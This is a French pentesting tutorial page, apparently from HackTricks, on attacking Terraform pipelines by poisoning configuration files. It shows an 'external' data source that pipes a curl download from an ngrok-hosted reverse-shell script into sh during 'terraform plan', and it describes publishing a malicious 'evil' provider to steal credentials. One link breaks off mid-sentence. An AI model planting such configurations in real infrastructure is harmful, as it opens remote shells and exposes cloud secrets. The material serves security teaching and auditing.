# S√©curit√© Terraform

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFT exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de base

HashiCorp Terraform est un outil d'**infrastructure en tant que code** qui vous permet de d√©finir des ressources **cloud et sur site** dans des fichiers de configuration lisibles par l'homme que vous pouvez versionner, r√©utiliser et partager. Vous pouvez ensuite utiliser un flux de travail coh√©rent pour provisionner et g√©rer toute votre infrastructure tout au long de son cycle de vie. Terraform peut g√©rer des composants de bas niveau tels que les ressources de calcul, de stockage et de mise en r√©seau, ainsi que des composants de haut niveau tels que les entr√©es DNS et les fonctionnalit√©s SaaS.

### Comment fonctionne Terraform ?

Terraform cr√©e et g√®re des ressources sur des plateformes cloud et d'autres services via leurs interfaces de programmation d'applications (API). Les fournisseurs permettent √† Terraform de fonctionner avec pratiquement toutes les plateformes ou services disposant d'une API accessible.

![](<../../.gitbook/assets/image (33).png>)

HashiCorp et la communaut√© Terraform ont d√©j√† √©crit **plus de 1700 fournisseurs** pour g√©rer des milliers de types de ressources et de services diff√©rents, et ce nombre continue de cro√Ætre. Vous pouvez trouver tous les fournisseurs disponibles publiquement sur le [Terraform Registry](https://registry.terraform.io/), y compris Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, et bien d'autres.

Le flux de travail de base de Terraform se compose de trois √©tapes :

* **√âcrire :** Vous d√©finissez des ressources, qui peuvent √™tre r√©parties sur plusieurs fournisseurs et services cloud. Par exemple, vous pouvez cr√©er une configuration pour d√©ployer une application sur des machines virtuelles dans un r√©seau Virtual Private Cloud (VPC) avec des groupes de s√©curit√© et un √©quilibreur de charge.
* **Plan :** Terraform cr√©e un plan d'ex√©cution d√©crivant l'infrastructure qu'il va cr√©er, mettre √† jour ou d√©truire en fonction de l'infrastructure existante et de votre configuration.
* **Appliquer :** Sur approbation, Terraform effectue les op√©rations propos√©es dans l'ordre correct, en respectant les d√©pendances de ressources. Par exemple, si vous mettez √† jour les propri√©t√©s d'un VPC et que vous modifiez le nombre de machines virtuelles dans ce VPC, Terraform recr√©era le VPC avant de mettre √† l'√©chelle les machines virtuelles.

![](<../../.gitbook/assets/image (81).png>)

### Terraform Enterprise

Terraform Enterprise vous permet d'**ex√©cuter des commandes** telles que `terraform plan` ou `terraform apply` √† distance dans une **version auto-h√©berg√©e de Terraform Cloud**. Par cons√©quent, si vous trouvez la **cl√© API** pour acc√©der √† ce serveur Terraform, vous pouvez le **compromettre**.\
Pour plus d'informations, consultez :

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Laboratoire Terraform

Il suffit d'installer terraform sur votre ordinateur.

Voici un [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) et voici la [meilleure fa√ßon de t√©l√©charger terraform](https://www.terraform.io/downloads).

## RCE dans Terraform

Terraform n'a pas de plateforme exposant une page web ou un service r√©seau que nous pouvons √©num√©rer, par cons√©quent, la seule fa√ßon de compromettre terraform est de **pouvoir ajouter/modifier des fichiers de configuration terraform**.

Cependant, terraform est un composant **tr√®s sensible** √† compromettre car il aura un **acc√®s privil√©gi√©** √† diff√©rents emplacements pour pouvoir fonctionner correctement.

La principale fa√ßon pour un attaquant de pouvoir compromettre le syst√®me o√π terraform est en cours d'ex√©cution est de **compromettre le r√©f√©rentiel qui stocke les configurations terraform**, car √† un moment donn√©, elles vont √™tre **interpr√©t√©es**.

En fait, il existe des solutions qui **ex√©cutent automatiquement terraform plan/apply apr√®s la cr√©ation d'un PR**, telles que **Atlantis** :

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

Si vous √™tes capable de compromettre un fichier terraform, il existe diff√©rentes fa√ßons de r√©aliser une RCE lorsque quelqu'un ex√©cute `terraform plan` ou `terraform apply`.

### Terraform plan

Terraform plan est la **commande la plus utilis√©e** dans terraform et les d√©veloppeurs/solutions utilisant terraform l'appellent tout le temps, donc le **moyen le plus facile d'obtenir une RCE** est de vous assurer que vous empoisonnez un fichier de configuration terraform qui ex√©cutera des commandes arbitraires dans un `terraform plan`.

#### Utilisation d'un fournisseur externe

Terraform offre le fournisseur [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs), qui fournit un moyen d'interfacer entre Terraform et des programmes externes. Vous pouvez utiliser la source de donn√©es `external` pour ex√©cuter du code arbitraire pendant un `plan`.

L'injection dans un fichier de configuration terraform de quelque chose comme ce qui suit ex√©cutera un shell rev lors de l'ex√©cution de `terraform plan` :

```javascript
data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

#### Utilisation d'un fournisseur personnalis√©

N'importe qui peut √©crire un [fournisseur personnalis√©](https://learn.hashicorp.com/tutorials/terraform/provider-setup) et le publier sur le [Terraform Registry](https://registry.terraform.io/). Vous pouvez √©galement essayer de tirer un fournisseur personnalis√© d'un registre priv√©.

C'est tout :

* √©crire un fournisseur personnalis√© qui ex√©cute un code malveillant (comme l'exfiltration de donn√©es d'identification ou de clients)
  * publiez-le sur le Terraform Registry
  * ajoutez le fournisseur au code Terraform dans une branche de fonctionnalit√©
  * ouvrez une PR pour la branche de fonctionnalit√©

```javascript
 terraform {
        required_providers {
            evil = {
                source  = "evil/evil"
                    version = "1.0"
            }
        }
    }

provider "evil" {}
```

Comme le fournisseur sera extrait pendant l'`init` et ex√©cutera du code pendant le `plan`, vous avez une ex√©cution de code arbitraire.

Vous pouvez trouver un exemple dans [https://github.com/rung/terraform
## Outils d'audit

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utilise l'analyse statique de votre code terraform pour rep√©rer les configurations incorrectes potentielles.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan est un analyseur de code statique pour l'Infrastructure en tant que Code.

## R√©f√©rences

* [Atlantis Security](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>